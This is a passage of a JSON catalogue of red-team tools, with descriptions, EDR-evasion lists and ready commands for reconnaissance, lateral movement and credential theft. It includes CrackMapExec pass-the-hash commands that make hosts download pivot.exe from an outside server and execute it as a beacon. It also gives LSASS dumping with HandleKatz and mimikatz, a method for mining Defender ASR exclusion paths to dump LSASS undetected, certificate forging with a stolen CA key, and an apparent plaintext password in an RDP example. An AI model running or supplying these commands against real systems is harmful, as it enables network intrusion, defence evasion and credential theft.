    "content": "\n## [[Categorize Domain]]\n\n\u26a0\ufe0f When attempting to categorise a site in Bluecoat, do not check the category first otherwise it will end up uncategorised! Individual hosts can however be categorised differently.\n\n'''\nusage: chameleon.py [-h] [--proxy <proxy>] [--check] [--submit]\n                    [--domain <domain>]\n\noptional arguments:\n  -h, --help         show this help message and exit\n  --proxy <proxy>    Proxy type: a = all, b = bluecoat, m = mcafee, i = IBM\n                     Xforce\n  --check            Perform check on current category\n  --submit           Submit new category\n  --domain <domain>  Domain to validate\n'''\n\n\n",
    "commands": [
      {
        "id": "3a3033f5-5477-4e80-b39c-242e4c529e4b",
        "name": "Check categorization",
        "description": "Check categorization for Bluecoat, McAfee Trustedsource and IBM X-Force",
        "tag": "",
        "results": [],
        "cmd": "python chameleon.py --proxy a --check --domain google.com"
      },
      {
        "id": "db1ceb93-65c0-4b1e-80d3-c0ae724e4914",
        "name": "Submit categorization",
        "description": "Submit categorization to Bluecoat, McAfee Trustedsource and IBM X-Force",
        "tag": "",
        "results": [],
        "cmd": "python chameleon.py --proxy a --submit --domain google.com"
      }
    ],
    "latest_commit": "2022-10-13T02:59:15Z"
  },
  {
    "name": "CoffeeLdr",
    "phases": [],
    "category": "",
    "stealthy": false,
    "platforms": [
      "Windows"
    ],
    "source": "https://github.com/Cracked5pider/CoffeeLdr",
    "description": "Running Cobalt Strike bofs without CS",
    "undetected": [],
    "detected": [],
    "content": "\n\n\n",
    "commands": [],
    "latest_commit": "2022-11-07T20:56:54Z"
  },
  {
    "name": "Collector",
    "phases": [
      "02. Reconnaissance"
    ],
    "category": "OSINT",
    "stealthy": false,
    "platforms": [
      "Linux"
    ],
    "source": "https://github.com/galihap76/collector",
    "description": "Collector is a OSINT tool and information gathering. This tool can do information gathering phone numbers, github account, ip address and instagram account.",
    "undetected": [],
    "detected": [],
    "content": "\n## [[Passive Reconnaissance]]\n\n",
    "commands": [
      {
        "id": "955ce93e-932e-4e5b-8e7a-8918611697dc",
        "name": "Install",
        "description": "",
        "tag": "",
        "results": [],
        "cmd": "git clone https://github.com/galihap76/collector.git\ncd collector \npip install -r requirements.txt\npython3 main.py --update"
      },
      {
        "id": "4875efe7-41e8-4700-b6eb-5413570b57b1",
        "name": "Get info via IP",
        "description": "",
        "tag": "",
        "results": [],
        "cmd": "python3 main.py -i <ip address>",
        "requirements": {
          "tag": "COMPUTER:IP"
        }
      },
      {
        "id": "87e07916-e228-4131-b0ee-d6112b46b00f",
        "name": "Get info via Instagram",
        "description": "",
        "tag": "",
        "results": [],
        "cmd": "python3 main.py --login -u <YOUR USERNAME> -p <YOUR PASSWORD>\npython3 main.py -ig <target username>"
      }
    ],
    "latest_commit": "2023-04-25T01:47:36Z"
  },
  {
    "name": "crackmapexec",
    "phases": [
      "07. Lateral Movement",
      "08. Credentials & User Impersonation",
      "02. Reconnaissance"
    ],
    "category": "",
    "stealthy": false,
    "platforms": [
      "Linux"
    ],
    "source": "https://github.com/byt3bl33d3r/CrackMapExec",
    "description": "CrackMapExec (a.k.a CME) is a post-exploitation tool that helps automate assessing the security of large Active Directory networks. Built with stealth in mind, CME follows the concept of \"Living off the Land\": abusing built-in Active Directory features/protocols to achieve it's functionality and allowing it to evade most endpoint protection/IDS/IPS solutions.",
    "undetected": [],
    "detected": [],
    "content": "# Crackmapexec\n\n## Deploy custom beacon\ncrackmapexec smb 172.29.138.0/24 -u Administrator -H <hash> -x \"curl -o C:\\Windows\\Temp\\pivot.exe http://172.29.137.67:8081/pivot.exe\"\ncrackmapexec smb 172.29.138.0/24 -u Administrator -H <hash> -x \"powershell.exe Invoke-Command -ScriptBlock {C:\\Windows\\Temp\\pivot.exe}\"\n\n## Test multipe credentials\n'''sh\n#Pattern: (.*):(.*):(.*):(.*):::\n#Replacement: crackmapexec smb 172.29.139.180 -u $1 -H $4 -x whoami\ncrackmapexec smb 172.29.139.180 -u <USER> -H <NTLM> -x whoami\n'''\n\n## [[Guest Access (SMB)]]\nEnumerate null sessions\n>cme smb <ip> -u '' -p ''  \n\nEnumerate Anonymous access\n>cme smb <ip> -u 'a' -p ''\n\n## [[SMB Signing]]\nChecking for SMB signing\n\n## [[User enum]]\n>cme smb <ip> -u <user> -p '<password>' --users\n\n## [[Shares]]\n* Enumerate smb hosts  \n>cme smb <ip_range>\n\n",
    "commands": [
      {
        "id": "cba65b8b-1f83-467a-8608-4e3965340652",
        "name": "Run command via SMB",
        "description": "For example deploying a beacon via SMB",
        "tag": "",
        "results": [
          "EXECUTION:REMOTE"
        ],
        "cmd": "crackmapexec smb 172.29.138.0/24 -u Administrator -H <hash> -x \"curl -o C:\\Windows\\Temp\\pivot.exe http://172.29.137.67:8081/pivot.exe\"\ncrackmapexec smb 172.29.138.0/24 -u Administrator -H <hash> -x \"powershell.exe Invoke-Command -ScriptBlock {C:\\Windows\\Temp\\pivot.exe}\"",
        "requirements": {
          "and": [
            {
              "tag": "CRED:HASH"
            },
            {
              "tag": "SERVICE:SMB"
            },
            {
              "tag": "PRIVS:ADMIN"
            }
          ]
        }
      },
      {
        "id": "624a21de-3375-4b68-868a-a6408521ce6b",
        "name": "Enumerate null / anon sessions",
        "description": "",
        "tag": "",
        "results": [],
        "cmd": "cme smb <ip> -u '' -p ''\ncme smb <ip> -u 'a' -p ''"
      },
      {
        "id": "641aee06-bfb3-41db-b032-58eb372f4b5c",
        "name": "Remote user enumeration",
        "description": "",
        "tag": "",
        "results": [],
        "cmd": "cme smb <ip> -u <user> -p '<password>' --users"
      },
      {
        "id": "9572ef78-24b0-4515-9fda-cd273050ae01",
        "name": "Enumerate smb hosts",
        "description": "",
        "tag": "",
        "results": [],
        "cmd": "cme smb <ip_range>"
      }
    ],
    "references": [
      "https://wiki.porchetta.industries/"
    ],
    "latest_commit": "2023-05-15T07:30:58Z"
  },
  {
    "name": "cs2modrewrite",
    "phases": [
      "00. Infrastructure"
    ],
    "category": "",
    "stealthy": false,
    "platforms": [
      "Linux"
    ],
    "source": "https://github.com/threatexpress/cs2modrewrite",
    "description": "Convert Cobalt Strike profiles to modrewrite",
    "undetected": [],
    "detected": [],
    "content": "\n## [[00.Infrastructure/Redirector]]\n\n",
    "commands": [],
    "latest_commit": "2023-01-30T17:47:51Z"
  },
  {
    "name": "cs2webconfig",
    "phases": [
      "00. Infrastructure"
    ],
    "category": "",
    "stealthy": false,
    "platforms": [
      "Linux"
    ],
    "source": "https://github.com/bashexplode/cs2webconfig",
    "description": "Convert Cobalt Strike profiles to IIS web.config files",
    "undetected": [],
    "detected": [],
    "content": "\n## [[00.Infrastructure/Redirector]]\n\n",
    "commands": [],
    "latest_commit": "2021-08-23T21:42:06Z"
  },
  {
    "name": "dnsrecon",
    "phases": [
      "02. Reconnaissance"
    ],
    "category": "OSINT",
    "stealthy": false,
    "platforms": [
      "Python"
    ],
    "source": "https://github.com/darkoperator/dnsrecon",
    "description": "DNSRecon is a Python port of a Ruby script that I wrote to learn the language and about DNS in early 2007. This time I wanted to learn about Python and extend the functionality of the original tool and in the process re-learn how DNS works and how could it be used in the process of a security assessment and network troubleshooting.",
    "undetected": [],
    "detected": [],
    "content": "\n## [[DNS]]\nEnumerate DNS\n\n",
    "commands": [
      {
        "id": "56135c43-1def-4d31-80ba-2f00042555b8",
        "name": "Base domain enumeration",
        "description": "",
        "tag": "",
        "results": [],
        "cmd": "dnsrecon -d www.acme.com"
      },
      {
        "id": "59b387be-ae9c-4bda-8c05-e8c9a92faa45",
        "name": "Base domain enum to SQL",
        "description": "",
        "tag": "",
        "results": [],
        "cmd": "dnsrecon -d www.acme.com --db /path/to/sqllite.file"
      },
      {
        "id": "ddc7f920-b894-4b73-abc1-aa473288b980",
        "name": "Zone walking",
        "description": "",
        "tag": "",
        "results": [],
        "cmd": "dnsrecon -d www.acme.com -t zonewalk"
      },
      {
        "id": "19b43fa4-ebd8-4856-9aec-640afe215bba",
        "name": "Brute-forcing of domains",
        "description": "",
        "tag": "",
        "results": [],
        "cmd": "dnsrecon -d www.acme.com -D /path/to/dict.txt -t brt"
      },
      {
        "id": "88e7859d-2e6c-483a-ad2d-7c9d9376f74b",
        "name": "Reverse lookup",
        "description": "",
        "tag": "",
        "results": [],
        "cmd": "dnsrecon -r 208.67.222.200-208.67.222.255 -d microsoft.com\n"
      }
    ],
    "references": [
      "https://www.kali.org/tools/dnsrecon/#:~:text=DNSRecon%20is%20a%20Python%20script,Perform%20common%20SRV%20Record%20Enumeration"
    ],
    "latest_commit": "2023-05-02T21:05:22Z"
  },
  {
    "name": "Dumpert",
    "phases": [
      "08. Credentials & User Impersonation"
    ],
    "category": "",
    "stealthy": false,
    "platforms": [
      "Windows"
    ],
    "source": "https://github.com/outflanknl/Dumpert",
    "description": "LSASS memory dumper using direct system calls and API unhooking.",
    "undetected": [],
    "detected": [
      "McAfee"
    ],
    "content": "\n## [[LSASS dumping]]\n\n",
    "commands": [],
    "latest_commit": "2021-01-05T08:58:26Z"
  },
  {
    "name": "enum4linux",
    "phases": [
      "02. Reconnaissance"
    ],
    "category": "",
    "stealthy": false,
    "platforms": [
      "Linux"
    ],
    "source": "https://github.com/CiscoCXSecurity/enum4linux",
    "description": "About enum4Linux is a Linux alternative to enum.exe for enumerating data from Windows and Samba hosts",
    "undetected": [],
    "detected": [],
    "content": "\n## [[Guest Access (SMB)]]\n> enum4linux -a -u \"\" -p \"\" <dc-ip>  \n> enum4linux -a -z \"guest\" -o \" <dc-ip>  \n\n## [[User enum]]\n> enum4linux -U <dc-ip> | grep 'user:'\n\n",
    "commands": [
      {
        "id": "3b2630cc-65ab-4928-b46d-fc3f404c9283",
        "name": "Commands",
        "description": "",
        "tag": "",
        "results": [],
        "cmd": "Usage: ./enum4linux.pl [options] ip\n\nOptions are (like \"enum\"):\n    -U        get userlist\n    -M        get machine list*\n    -S        get sharelist\n    -P        get password policy information\n    -G        get group and member list\n    -d        be detailed, applies to -U and -S\n    -u user   specify username to use (default \"\")  \n    -p pass   specify password to use (default \"\")"
      }
    ],
    "references": [
      "https://www.kali.org/tools/enum4linux/#:~:text=Enum4linux%20is%20a%20tool%20for,%2C%20rpclient%2C%20net%20and%20nmblookup"
    ],
    "latest_commit": "2023-05-09T22:54:24Z"
  },
  {
    "name": "Espoofer",
    "phases": [
      "01. Initial Access",
      "08. Credentials & User Impersonation"
    ],
    "category": "",
    "stealthy": false,
    "platforms": [
      "Python"
    ],
    "source": "https://github.com/chenjj/espoofer",
    "description": "An email spoofing testing tool that aims to bypass SPF/DKIM/DMARC and forge DKIM signatures.\ud83c\udf7b",
    "undetected": [],
    "detected": [],
    "content": "\n## [[Internal Phishing]][[Phishing]]\nChecking for spoofable header\n\n",
    "commands": [
      {
        "id": "2e5b14fc-a885-49d1-9c5f-2f8f04290901",
        "name": "Install",
        "description": "",
        "tag": "",
        "results": [],
        "cmd": "git clone https://github.com/chenjj/espoofer\nsudo pip3 install -r requirements.txt"
      }
    ],
    "latest_commit": "2022-05-13T06:52:47Z"
  },
  {
    "name": "Ettercap",
    "phases": [
      "02. Reconnaissance",
      "08. Credentials & User Impersonation"
    ],
    "category": "",
    "stealthy": false,
    "platforms": [
      "Linux"
    ],
    "source": "https://github.com/Ettercap/ettercap",
    "description": "A suite for man in the middle attacks",
    "undetected": [],
    "detected": [],
    "content": "# Ettercap\n\nEttercap is an open-source program that combines a packet sniffer for different protocols (POP/HTPPS/HTTPS/SFTP), but it also offers password cracking features. It can sniff and gather data while using MITM attacks. We will be covering the Linux version for the most part and will use the graphical interface.\n\n## [[08.Credentials & User Impersonation/MITM]]\nRun ettercap with UI\n\n```bash\nsudo ettercap -G\n```\n\n1.  Select mode  \n    **Unified**: sniff  \n    **Bridged:** sniff and forward\n2.  Select interface\n3.  Host list \u2192 add target 1 (gateway) + add target 2 (host)\n4.  Select attack (ARP poisoning, ICMP redirect, Port Stealing. DHCP spoofing)\n5.  Check the MAC  \n    Windows: arp -a  \n    Linux: arp\n6.  View \u2192 Connections\n\n**SSL/TLS decryption**\n\n*   change /etc/etthercap/etter.conf  \n    +- ec\\_uid = 0  \n    +- ec\\_gid = 0  \n    \\+ redir\\_command\\_on  \n    \\+ redir\\_command\\_off\n\n\n",
    "commands": [],
    "latest_commit": "2023-03-25T09:52:50Z"
  },
  {
    "name": "EyeWitness",
    "phases": [
      "02. Reconnaissance",
      "06. Domain Enumeration"
    ],
    "category": "",
    "stealthy": false,
    "platforms": [
      "Python",
      "Windows"
    ],
    "source": "https://github.com/FortyNorthSecurity/EyeWitness",
    "description": "EyeWitness is designed to take screenshots of websites provide some server header info, and identify default credentials if known.",
    "undetected": [],
    "detected": [],
    "content": "This is tool capable of identifying (and taking screenshots of) web apps from a list of targets.\n\n## [[Find Web Server]]\nLocal Scan (does not work)\n>./EyeWitness.py --localscan 192.168.1.0/24\n\nScan with multiple IPs received from NMAP\n'''sh\ncat /root/targets.txt\n10.10.17.71\n10.10.1.20\n10.10.17.68\n\nproxychains4 ./EyeWitness.py --web -f /root/targets.txt -d /root/edu --no-dns --no-prompt\n\nStarting Web Requests (3 Hosts)\nAttempting to screenshot http://10.10.17.71\n[*] WebDriverError when connecting to http://10.10.17.71\nAttempting to screenshot http://10.10.1.20\n[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.10.1.20:80  ...  OK\nAttempting to screenshot http://10.10.17.68\n[*] WebDriverError when connecting to http://10.10.17.68\nFinished in 12.967030048370361 seconds\n'''\n\n",
    "commands": [
      {
        "id": "f859e696-2096-4bbe-8a8f-1164b0d99f7a",
        "name": "Scan IP's from file",
        "description": "",
        "tag": "",
        "results": [],
        "cmd": "proxychains4 ./EyeWitness.py --web -f /root/targets.txt -d /root/edu --no-dns --no-prompt\n"
      }
    ],
    "latest_commit": "2023-05-05T16:01:06Z"
  },
  {
    "name": "FinalRecon",
    "phases": [
      "02. Reconnaissance"
    ],
    "category": "",
    "stealthy": false,
    "platforms": [
      "Python"
    ],
    "source": "https://github.com/thewhiteh4t/FinalRecon",
    "description": "FinalRecon is an automatic web reconnaissance tool written in python. Goal of FinalRecon is to provide an overview of the target in a short amount of time while maintaining the accuracy of results. Instead of executing several tools one after another it can provide similar results keeping dependencies small and simple.",
    "undetected": [],
    "detected": [],
    "content": "## Installation\n'''sh\ngit clone https://github.com/thewhiteh4t/FinalRecon.git\ncd FinalRecon\npip3 install -r requirements.txt\n'''\n\n## [[Passive Reconnaissance]]\n'''sh\npython3 finalrecon.py -h\nusage: finalrecon.py [-h] [--headers] [--sslinfo] [--whois] [--crawl] [--full]\n                     url\n\nFinalRecon - OSINT Tool for All-In-One Web Recon | v1.0.0\n\npositional arguments:\n  url         Target URL\n\noptional arguments:\n  -h, --help  show this help message and exit\n  --headers   Get Header Information\n  --sslinfo   Get SSL Certificate Information\n  --whois     Get Whois Lookup\n  --crawl     Crawl Target Website\n  --full      Get Full Analysis, Test All Available Options\n\n# Check headers\npython3 finalrecon.py --headers <url>\n\n# Check ssl Certificate\npython3 finalrecon.py --sslinfo <url>\n\n# Check whois Information\npython3 finalrecon.py --whois <url>\n\n# Crawl Target\npython3 finalrecon.py --crawl <url>\n\n# full scan\npython3 finalrecon.py --full <url>\n'''\n\n\n",
    "commands": [
      {
        "id": "3f7795a8-a883-450f-900d-6b37c0dd9449",
        "name": "Install",
        "description": "",
        "tag": "",
        "results": [],
        "cmd": "git clone https://github.com/thewhiteh4t/FinalRecon.git\ncd FinalRecon\npip3 install -r requirements.txt"
      },
      {
        "id": "3ea5ed52-fa49-4ad3-a7f2-3e7e49b873ae",
        "name": "Check SSL Certificate",
        "description": "",
        "tag": "",
        "results": [],
        "cmd": "python3 finalrecon.py --sslinfo <url>"
      },
      {
        "id": "447d2228-3aac-45cf-86aa-35183a405b2c",
        "name": "Check whois Information",
        "description": "",
        "tag": "",
        "results": [],
        "cmd": "python3 finalrecon.py --whois <url>"
      },
      {
        "id": "511c55e2-eaef-4a11-9a62-54d74a89736b",
        "name": "Crawl Target",
        "description": "",
        "tag": "",
        "results": [],
        "cmd": "python3 finalrecon.py --crawl <url>"
      },
      {
        "id": "787e77cb-9e0b-4164-a58b-210b751f28f1",
        "name": "Full Scan",
        "description": "",
        "tag": "",
        "results": [],
        "cmd": "python3 finalrecon.py --full <url>"
      }
    ],
    "latest_commit": "2023-01-26T03:58:16Z"
  },
  {
    "name": "FOCA",
    "phases": [
      "02. Reconnaissance"
    ],
    "category": "",
    "stealthy": false,
    "platforms": [
      "Windows"
    ],
    "source": "https://github.com/ElevenPaths/FOCA",
    "description": "Tool to find metadata and hidden information in the documents.",
    "undetected": [],
    "detected": [],
    "content": "FOCA (Fingerprinting Organizations with Collected Archives)\nFOCA is a tool used mainly to find metadata and hidden information in the documents it scans. These documents may be on web pages, and can be downloaded and analysed with FOCA.\n\nIt is capable of analysing a wide variety of documents, with the most common being Microsoft Office, Open Office, or PDF files, although it also analyses Adobe InDesign or SVG files, for instance.\n\nThese documents are searched for using three possible search engines: Google, Bing, and DuckDuckGo. The sum of the results from the three engines amounts to a lot of documents. It is also possible to add local files to extract the EXIF information from graphic files, and a complete analysis of the information discovered through the URL is conducted even before downloading the file.\n\n## [[Metadata]]\nDownload [here](https://github.com/ElevenPaths/FOCA/releases)\n\n",
    "commands": [],
    "latest_commit": "2022-12-08T09:31:55Z"
  },
  {
    "name": "ForgeCert",
    "phases": [
      "02. Reconnaissance",
      "08. Credentials & User Impersonation"
    ],
    "category": "",
    "stealthy": false,
    "platforms": [
      "Windows"
    ],
    "source": "https://github.com/GhostPack/ForgeCert",
    "description": "Generate certs",
    "undetected": [],
    "detected": [],
    "content": "# ForgeCert\n\n## [[Forged Certificates]]\nGenerate certificate with stolen pk\n'''beacon\nC:\\Users\\Administrator\\Desktop>C:\\Tools\\ForgeCert\\ForgeCert\\bin\\Debug\\ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword \"password\" --Subject \"CN=User\" --SubjectAltName \"Administrator@evil.corp\" --NewCertPath fake.pfx --NewCertPassword \"password\"\nCA Certificate Information:\n  Subject:        CN=ca-1, DC=evil, DC=corp\n  Issuer:         CN=ca-1, DC=evil, DC=corp\n  Start Date:     2/25/2022 11:29:14 AM\n  End Date:       2/25/2047 11:39:08 AM\n  Thumbprint:     7F8A1EFB7A50E2D1DE098085301926AA13AE0A71\n  Serial:         31AC83C6678F28994CFB58207C9FB668\n\nForged Certificate Information:\n  Subject:        CN=User\n  SubjectAltName: Administrator@evil.corp\n  Issuer:         CN=ca-1, DC=evil, DC=corp\n  Start Date:     3/1/2022 2:19:20 PM\n  End Date:       3/1/2023 2:19:20 PM\n  Thumbprint:     73C45EC22357C0451E0F374AC30B5C6F6034B132\n  Serial:         009E1C0AE8A247695199F8157DB37E38AD\n\nDone. Saved forged certificate to fake.pfx with the password 'password'\n'''\n\n",
    "commands": [
      {
        "id": "769c8351-fac6-43a1-abf8-e5ddcf6630d7",
        "name": "Forge Cert with PK",
        "description": "",
        "tag": "",
        "results": [],
        "cmd": "ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword \"password\" --Subject \"CN=User\" --SubjectAltName \"Administrator@evil.corp\" --NewCertPath fake.pfx --NewCertPassword \"password\""
      }
    ],
    "latest_commit": "2022-10-07T18:18:09Z"
  },
  {
    "name": "FreeRDP",
    "phases": [
      "07. Lateral Movement"
    ],
    "category": "",
    "stealthy": false,
    "platforms": [
      "Linux"
    ],
    "source": "https://github.com/FreeRDP/FreeRDP",
    "description": "RDP client which can be used with hashes",
    "undetected": [],
    "detected": [],
    "content": "# FreeRDP\n\n## [[RDP]]\n```bash\nxfreerdp /u:user /p:yGWrFM9jn37K /v:pc.testdomain.local\n```\n\n# Resources\n[https://github.com/awakecoding/FreeRDP-Manuals/blob/master/User/FreeRDP-User-Manual.markdown](https://github.com/awakecoding/FreeRDP-Manuals/blob/master/User/Free[[NMAP]]\n\n\n",
    "commands": [],
    "latest_commit": "2023-05-15T19:25:10Z"
  },
  {
    "name": "Get-BrowserData",
    "phases": [
      "03. Host Enumeration"
    ],
    "category": "",
    "stealthy": false,
    "platforms": [
      "Windows"
    ],
    "source": "https://github.com/rvrsh3ll/Misc-Powershell-Scripts/blob/master/Get-BrowserData.ps1",
    "description": "Enumerates browser history or bookmarks for a Chrome, Internet Explorer, and/or Firefox browsers on Windows machines.",
    "undetected": [],
    "detected": [],
    "content": "",
    "commands": [
      {
        "id": "603efb47-0b5a-4dc7-b0b4-4e730d2d6e64",
        "name": "Help",
        "description": "",
        "tag": "",
        "results": [],
        "cmd": ".PARAMETER Browser\n    The type of browser to enumerate, 'Chrome', 'IE', 'Firefox' or 'All'\n.PARAMETER Datatype\n    Type of data to enumerate, 'History' or 'Bookmarks'\n.PARAMETER UserName\n    Specific username to search browser information for.\n.PARAMETER Search\n    Term to search for"
      },
      {
        "id": "fd8746d2-eef6-46b5-a2fa-3ef27f98d269",
        "name": "Enumerates bookmarks for IE for 'user1' and filter after 'github'.",
        "description": "",
        "tag": "",
        "results": [
          "COMPUTER:BOOKMARKS"
        ],
        "cmd": "Get-BrowserData -Browser All -Datatype History -UserName user1 -Search 'github'",
        "requirements": {
          "tag": "INTEL:DOMAIN:USERS"
        }
      }
    ],
    "latest_commit": "2022-10-20T10:23:08Z"
  },
  {
    "name": "GoWitness",
    "phases": [
      "02. Reconnaissance",
      "06. Domain Enumeration"
    ],
    "category": "",
    "stealthy": true,
    "platforms": [
      "Linux"
    ],
    "source": "https://github.com/sensepost/gowitness",
    "description": "Pictures of webservers",
    "undetected": [],
    "detected": [],
    "content": "\n## [[Find Web Server]]\nScan internal network\n* Screenshot a single website  \n> gowitness single https://www.google.com/\n* Screenshot a cidr using 20 threads  \n> gowitness scan --cidr 192.168.0.0/24 --threads 20\n* Scan based on Nessus scan\n> .\\gowitness-2.4.0-windows-amd64.exe nessus -f .\\ScanniSceneroni_xm6g2a.nessus\n* Scan based on URL/IP file\n> .\\gowitness-2.4.0-windows-amd64.exe file -f '.\\External Pentesting\\urls.txt'\n* Screenshot open http services from an namp file  \n> gowitness nmap -f nmap.xml --open --service-contains http\n* Run the report server  \n> gowitness report serve\n\n",
    "commands": [
      {
        "id": "78c1f2ef-d03b-4d0e-af0c-63566fe1733b",
        "name": "Screenshot a single website",
        "description": "",
        "tag": "",
        "results": [],
        "cmd": "gowitness single https://www.google.com/"
      },
      {
        "id": "2683dac7-4a17-4e8b-b069-8332b5df95d9",
        "name": "Screenshot a cidr using 20 threads",
        "description": "",
        "tag": "",
        "results": [],
        "cmd": "gowitness scan --cidr 192.168.0.0/24 --threads 20"
      },
      {
        "id": "0564da3e-27bf-4b2a-8fa0-48aeed967903",
        "name": "Scan based on Nessus scan",
        "description": "",
        "tag": "",
        "results": [],
        "cmd": ".\\gowitness-2.4.0-windows-amd64.exe nessus -f .\\ScanniSceneroni_xm6g2a.nessus"
      },
      {
        "id": "966b5f10-0d75-4aeb-aae8-442a9d97e8fe",
        "name": "Scan based on URL/IP file",
        "description": "",
        "tag": "",
        "results": [],
        "cmd": ".\\gowitness-2.4.0-windows-amd64.exe file -f 'urls.txt"
      },
      {
        "id": "635a546b-c13d-459b-a173-7230bcb506bb",
        "name": "Screenshot open http services from an nmap file",
        "description": "",
        "tag": "",
        "results": [],
        "cmd": "gowitness nmap -f nmap.xml --open --service-contains http"
      },
      {
        "id": "e5a98439-d851-45e1-9047-2b36877d7c6d",
        "name": "Run the report server",
        "description": "",
        "tag": "",
        "results": [],
        "cmd": "gowitness report serve"
      }
    ],
    "latest_commit": "2023-05-07T14:58:14Z"
  },
  {
    "name": "GPRegistryPolicyParser",
    "phases": [
      "09. AD Misconfigurations"
    ],
    "category": "",
    "stealthy": false,
    "platforms": [
      "Windows"
    ],
    "source": "https://github.com/PowerShell/GPRegistryPolicyParser",
    "description": "These cmdlets will allow you to work with .POL files, which contain the registry keys enacted by Group Policy.",
    "undetected": [],
    "detected": [],
    "content": "# GPRegistryPolicyParser\n\n## [[Group Policy (GPO)]]\n`Parse-PolFile` from the [GPRegistryPolicyParser](https://github.com/PowerShell/GPRegistryPolicyParser) package can be used to convert this file into human-readable format.\n```beacon\nPS C:\\Users\\Administrator\\Desktop> Parse-PolFile .\\Registry.pol\n\nKeyName     : Software\\Policies\\Microsoft Services\\AdmPwd\nValueName   : PasswordComplexity\nValueType   : REG_DWORD\nValueLength : 4\nValueData   : 3    <-- Password contains uppers, lowers and numbers (4 would also include specials)\n\nKeyName     : Software\\Policies\\Microsoft Services\\AdmPwd\nValueName   : PasswordLength\nValueType   : REG_DWORD\nValueLength : 4\nValueData   : 14   <-- Password length is 14\n\nKeyName     : Software\\Policies\\Microsoft Services\\AdmPwd\nValueName   : PasswordAgeDays\nValueType   : REG_DWORD\nValueLength : 4\nValueData   : 7    <-- Password is changed every 7 days\n\nKeyName     : Software\\Policies\\Microsoft Services\\AdmPwd\nValueName   : AdminAccountName\nValueType   : REG_SZ\nValueLength : 14\nValueData   : lapsadmin   <-- The name of the local admin account to manage\n\nKeyName     : Software\\Policies\\Microsoft Services\\AdmPwd\nValueName   : AdmPwdEnabled\nValueType   : REG_DWORD\nValueLength : 4\nValueData   : 1   <-- LAPS is enabled\n```\n\n\n",
    "commands": [],
    "latest_commit": "2021-08-05T20:01:31Z"
  },
  {
    "name": "Handlekatz-BOF",
    "phases": [
      "08. Credentials & User Impersonation"
    ],
    "category": "",
    "stealthy": false,
    "platforms": [
      "Windows"
    ],
    "source": "https://github.com/EspressoCake/HandleKatz_BOF",
    "description": "This tool was implemented as part of our Brucon2021 conference talk and demonstrates the usage of cloned handles to Lsass in order to create an obfuscated memory dump of the same.",
    "undetected": [
      "MDE",
      "BitDefender",
      "Cylance",
      "McAfee",
      "Tanium"
    ],
    "detected": [],
    "content": "# Handlekatz\n\n## [[LSASS dumping]]\n*Make all* to build handlekatz.x64.o and handlekatz_bof.cna`\nPut them into the same folder and load the .cna script.\n`handlekatz <lsass-pid> C:\\Windows\\Temp\\sql.bin`\n\n",
    "commands": [],
    "latest_commit": "2021-10-12T21:38:02Z"
  },
  {
    "name": "Handlekatz",
    "phases": [
      "08. Credentials & User Impersonation"
    ],
    "category": "",
    "stealthy": false,
    "platforms": [
      "Windows"
    ],
    "source": "https://github.com/codewhitesec/HandleKatz",
    "description": "This tool was implemented as part of our Brucon2021 conference talk and demonstrates the usage of cloned handles to Lsass in order to create an obfuscated memory dump of the same.",
    "undetected": [
      "MDE",
      "BitDefender",
      "Cylance"
    ],
    "detected": [],
    "content": "# Handlekatz\n\nSo, how do you go about dumping lsass.exe on a box protected with MDE and ASR? Well, fortunately you can leverage a variety of whitelisted paths within the Defender ASR rules that help you achieve this. After finding a whitelisted exclusion path for the ASR rule you want to bypass, simply run your executable from that path!\nWindows Defender signatures/rules are stored in VDM containers. Many of them are just Lua script files. It\u2019s possible to use a tool such as WDExtract to decrypt and extract all the PE images from these containers. By analyzing the extracted VDM you can pull whitelisted exclusion paths for ASR rules.\nI will now demonstrate a very quick, hacky way to quickly get an updated list of potential exclusion paths for particular ASR rules.\nLet\u2019s pick on the ASR rule for \u201cBlock credential stealing from the Windows local security authority subsystem\u201d.\nHere is a link to the particular ruleset on MSDN. Here you can see that the ASR rule is tied to a particular GUID, in this case 9e6c4e1f-7d60-472f-ba1a-a39ef669e4b2.\nThis rule can be enabled on your machine with the following PowerShell script: Set-MpPreference -AttackSurfaceReductionRules_Ids 9e6c4e1f-7d60-472f-ba1a-a39ef669e4b2 -AttackSurfaceReductionRules_Actions Enabled\n* First, we need to locate the Defender signature files. You can usually find these in the following location: C:\\ProgramData\\Microsoft\\Windows Defender\\Definition Updates\\Backup\n* In our case, we are primarily interested in the mpasbase.vdm file.\n* Let\u2019s extract the file using WDExtract: wdextract64.exe mpasbase.vdm\n* Open the extracted file mpasbase.vdm.extracted in a Hex Editor, such as HxD.\n* Search for the GUID of the ASR rule you want to investigate:\n* Scroll down slightly to see the list of exclusions and extract the data:\nIt\u2019s important to keep in mind that the list of paths you may see here in the hex dump are not always exclusions. They can be part of other paths listed for ASR rules such as Monitored Locations. You\u2019ll need to do some testing/investigating to confirm if you are just naivley using content from the hex dump.\nUltimately, this gives us a list of excluded paths that are allowed to perform lsass.exe dumps even with the ASR rule enabled\nhttps://adamsvoboda.net/extracting-asr-rules/\n\n## [[LSASS dumping]]\n*Make all* to build HandleKatzPIC.exe, HandleKatz.bin and loader.exe`\nLoader implements a sample loader for HandleKatz:\n> loader.exe --pid:7331 --outfile:C:\\Temp\\dump.obfuscated\n> python3 /mnt/c/Users/patri/source/repos/HandleKatz/Decoder.py -i \"/mnt/c/Users/patri/Downloads\ndon/sql2.bin\" -o \"/mnt/c/Users/patri/Downloads/sql2.dmp\"\n> .\\mimikatz.exe \"log C:\\Users\\patri\\Downloads\\log.txt\" \"sekurlsa::minidump C:\\Users\\patri\\Downloads\\sql2.bin\" \"sekurlsa::logonPasswords\"\n> C:\\Users\\patri\\Documents\\Red-Teaming\\credentials\\KatzKatz-ExtractNTLM\\katzkatz.py -f C:\\Users\\patri\\Downloads\\Garmaredon\\log.txt\n\n",
    "commands": [],
    "latest_commit": "2022-10-18T08:55:13Z"
  },
  {
    "name": "Hashcat",
    "phases": [
      "02. Reconnaissance",
      "08. Credentials & User Impersonation"
    ],
    "category": "",
    "stealthy": false,
    "platforms": [
      "Linux"
    ],
    "source": "https://hashcat.net/hashcat/",
    "description": "World's fastest password cracker\nWorld's first and only in-kernel rule engine",
    "undetected": [],
    "detected": [],
